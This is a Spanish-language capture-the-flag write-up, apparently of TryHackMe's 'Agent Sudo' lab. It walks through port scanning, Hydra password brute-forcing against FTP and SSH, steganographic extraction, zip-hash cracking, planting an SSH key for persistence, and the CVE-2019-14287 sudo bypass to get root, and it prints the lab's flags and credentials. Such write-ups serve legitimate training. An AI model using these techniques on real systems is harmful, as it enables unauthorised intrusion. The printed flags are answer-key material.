# Agent Sudo

`Try Hack Me` `Linux` `User-Agent` `Hydra` `stego` `John` `CVE-2019-14287` `sudo`

## Flags

* **User Flag:** `b03d975e8c92a7c04146cfa7a5a313c7`
* **Root Flag:** `b53a02f55b57d4439e3341834d70c062`

## Users

* chris _\(pwd FTP: `crystal`\)_
* james _\(pwd: `hackerrules!`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

![](https://i.imgur.com/QAJsdPx.png)

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 21 \(FTP\), 22 \(SSH\) y 80 \(HTTP\)

![](https://i.imgur.com/6KrPYFA.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p21,22,80 IP`

![](https://i.imgur.com/5EdbNlJ.png)

### Servicio HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress: `whatweb IP`

![](https://i.imgur.com/5hkPEuo.png)

Vemos que es un Apache normal. Accedemos al portal web y vemos la siguiente página.

![](https://i.imgur.com/DrD1AVz.png)

Vemos el código fuente de la página a ver si encontramos algo. No hay nada.

Vamos a hacer un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster**`gobuster dir -u IP -w DICT -q -n -e`

```text
-u        Target 
-w         Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

![](https://i.imgur.com/ErYBctz.png)

No vemos ningún path interesante.

> Por lo que nos dice el portal, podemos probar a colocar un user-agent a ver si cambia el acceso.
>
> Probamos cambiando el **User-Agent** por alguna palabra pero muestra la misma.

* Probamos varias formas de poner el User-Agent, con letras o números. 
* Vemos que en el portal, se firma como Agent R. Probamos con el User-Agent **R** pero nada. 
* Probamos con **A**, **B** y **C**.

![](https://i.imgur.com/2q3SgD0.png)

{% hint style="info" %}
Con el User-Agent **`C`** vemos que en el campo **`Location`** hay un fichero **`agent_C_attention.php`**.
{% endhint %}

![](https://i.imgur.com/r9c86q4.png)

{% hint style="warning" %}
Tenemos un usuario: **`chris`**
{% endhint %}

### Servicio FTP

Al ver que tiene FTP, probamos el acceso anónimo con **`ftp/ftp`**.

![](https://i.imgur.com/HAQaBdp.png)

Vemos que no funciona.

### Hydra

Tenemos un usuario **chris**, así que podemos probar a crackear los servicios FTP y SSH con ese usuario usando Hydra, ya que en la web le decían que era muy weak.

```text
#FTP
hydra -l chris -P DICT ftp://IP -t 16
#SSH
hydra -l chris -P DICT ssh://IP -t 16

 -l            Usuario
 -P            Diccionario de passwords (/usr/share/wordlists/rockyou.txt)
 ssh://IP      Servidor al que atacar
 -t            Número de hilos
```

![](https://i.imgur.com/qPfEfWj.png)

{% hint style="warning" %}
Funciona para el SSH. Tenemos la password de **chris**: **`crystal`**
{% endhint %}

Probamos la contraseña en el SSH pero no sirve.

Entramos por ftp **`ftp IP`** y vemos lo siguiente:

![](https://i.imgur.com/9SnOQ1c.png)

Descargamos todos los ficheros con **`mget *`** a nuestra máquina para analizarlos.

![](https://i.imgur.com/Wtmps8q.png)

Vemos que se indica que en las fotos hay una password oculta.

## Stego

Le pasamos varios comandos stego a las 2 fotos.

Con `file FOTO` vemos que son un PNG y un JPG

Con `strings FOTO` vemos que **cutie.png** contiene oculto un fichero **`To_AgentR.txt`**.

![](https://i.imgur.com/0PwgJ5x.png)

Con `exiftool FOTO` no vemos ningun metadata útil

Con `binwalk -e FOTO` vemos de nuevo el fichero ocutlo **`To_AgentR.txt`**.

![](https://i.imgur.com/MMAS1x2.png)

Nos extrae los ficheros:

![](https://i.imgur.com/HzZ3ORB.png)

### ZIP Cracking

La nota esta vacía y el ZIP lleva contraseña. Intentamos crackear el zip con John:

Primero, convertimos el ZIP en un hash para john, con zip2john

```text
#Convertir el zip a un hash
/usr/sbin/zip2john ZIP_FILE > hash.txt

#Crack the password con Rockyou
/usr/sbin/john --wordlist=DICT hash.txt
```

![](https://i.imgur.com/8kD9WVR.png)

{% hint style="info" %}
Tenemos la password del ZIP: **`alien`**
{% endhint %}

Extraemos el fichero **`To_AgentR.txt`** y lo vemos:

![](https://i.imgur.com/2wthsuW.png)

Vemos que hay un código en base64:

![](https://i.imgur.com/9s44La5.png)

### Steghide

Sabemos que los ficheros estaban para usarse como stego. En uno hemos sacado un ZIP con una password/código **Area51**.

Probamos a ver si el otro fichero tiene cosas ocultas con esta password:

Usamos **`steghide --info FILE`** y como vemos que si, lo extraemos con **`steghide extract -sf FILE`**

![](https://i.imgur.com/W58wxrY.png)

{% hint style="danger" %}
Tenemos un usuario **`james`** y su password **`hackerrules!`**
{% endhint %}

## **Getting a shell**

Tenemos ya un usuario/password, por lo que conectamos por SSH:

![](https://i.imgur.com/CDzmbIj.png)

{% hint style="danger" %}
Podemos tener acceso sin contraseña copiando nuestra Clave Pública SSH

```bash
#ON MACHINE
cd
mkdir -p ~/.ssh
echo "[MY LOCAL ~/.ssh/id_rsa.pub]" >> ~/.ssh/authorized_keys

#ON KALI
ssh -i ~/.ssh/id_rsa USER@IP
```
{% endhint %}

### **User Flag**

En el directorio de joker vemos la **user.txt** flag.

{% hint style="success" %}
USER FLAG: **`b03d975e8c92a7c04146cfa7a5a313c7`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario james. Ejecutamos el comando `sudo -l`.

![](https://i.imgur.com/JHvsZ6d.png)

Vemos que indica que todos los usuarios pueden ejecutar el comando /bin/bash pero no como root, por lo que no deja ejecutarlo con sudo.

Buscamos información sobre esto porque me parece curioso el \(ALL, !root\). Busco en google **`(ALL, !root) /bin/bash`**. Lo primero que me sale:

![](https://i.imgur.com/0YqBDfQ.png)

Abrimos el exploit siguiente, correspondiente al **`CVE-2019-14287`**

{% embed url="https://www.exploit-db.com/exploits/47502" caption="" %}

Probamos el exploit con **`sudo -u#-1 /bin/bash`**

![](https://i.imgur.com/h6C12br.png)

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la **root.txt** flag.

{% hint style="success" %}
ROOT FLAG: **`b53a02f55b57d4439e3341834d70c062`**
{% endhint %}

![](https://i.imgur.com/rdGteDI.png)

